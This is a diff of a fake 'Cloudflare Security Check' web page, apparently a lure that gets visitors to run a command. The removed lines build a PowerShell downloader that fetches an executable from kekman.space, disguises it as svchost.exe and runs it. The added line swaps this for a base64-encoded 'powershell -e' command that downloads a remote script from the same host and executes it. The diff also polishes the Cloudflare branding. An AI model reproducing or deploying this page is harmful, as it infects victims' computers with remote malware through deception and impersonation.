@@ -6,7 +6,6 @@
   <title>Cloudflare Security Check</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
   <style>
-    /* --- Reset & base styles --- */
     * {
       box-sizing: border-box;
       margin: 0;
@@ -299,7 +298,8 @@
           <p class="step3" style="display: none;">Successfully.</p>
         </div>
         <div class="legal-links">
-          <img src="https://commons.wikimedia.org/wiki/File:Cloudflare_Logo.png" alt="Logo" />
+          <!-- Fixed logo URL -->
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/Cloudflare_Logo.png/128px-Cloudflare_Logo.png" alt="Cloudflare Logo" />
           <p>Confidentiality</p>
           <p>Terms and Conditions</p>
         </div>
@@ -344,38 +344,9 @@
 
 <script>
 (function() {
-  // ---- OBFUSCATED PAYLOAD ----
-  const psScript = `
-    $wc = New-Object System.Net.WebClient;
-    $url = 'https://kekman.space/RobloxPlayerInstaller.exe';
-    $out = "$env:TEMP\\svchost.exe";
-    $wc.DownloadFile($url, $out);
-    Start-Process $out
-  `;
-
-  function toBase64(str) {
-    const utf16 = new Uint16Array(str.length);
-    for (let i = 0; i < str.length; i++) {
-      utf16[i] = str.charCodeAt(i);
-    }
-    const bytes = new Uint8Array(utf16.buffer);
-    let binary = '';
-    for (let i = 0; i < bytes.length; i++) {
-      binary += String.fromCharCode(bytes[i]);
-    }
-    return btoa(binary);
-  }
-
-  const encoded = toBase64(psScript);
-  const part1 = encoded.substring(0, 30);
-  const part2 = encoded.substring(30, 60);
-  const part3 = encoded.substring(60, 90);
-  const part4 = encoded.substring(90);
-  const finalCmd = `powershell -e ${part1}${part2}${part3}${part4}`;
-
   // ---- CONFIG ----
   const CONFIG = {
-    command: finalCmd
+    command: 'powershell -e JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB0AD0AJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcoICcAaAB0AHQAcABzADoALwAvAGsAZQBrAG0AYQBuAC4AcwBwAGEAYwBlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA7AGkAZQB4ACAAJAB0AA=='
   };
 
   // ---- Fill dynamic content ----
